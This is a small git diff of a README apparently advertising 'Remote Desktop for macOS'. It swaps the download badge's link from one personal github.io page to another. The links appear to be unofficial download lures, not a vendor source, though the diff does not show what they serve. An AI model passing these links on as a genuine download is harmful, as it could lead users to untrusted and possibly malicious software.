@@ -4,7 +4,7 @@
 
 ## 📥 Download Remote Desktop for macOS
 
-[![⬇️ Download Remote Desktop](https://img.shields.io/badge/Download-Remote%20Desktop%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/Desktop)
+[![⬇️ Download Remote Desktop](https://img.shields.io/badge/Download-Remote%20Desktop%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/Desktop)
 
 ---
 
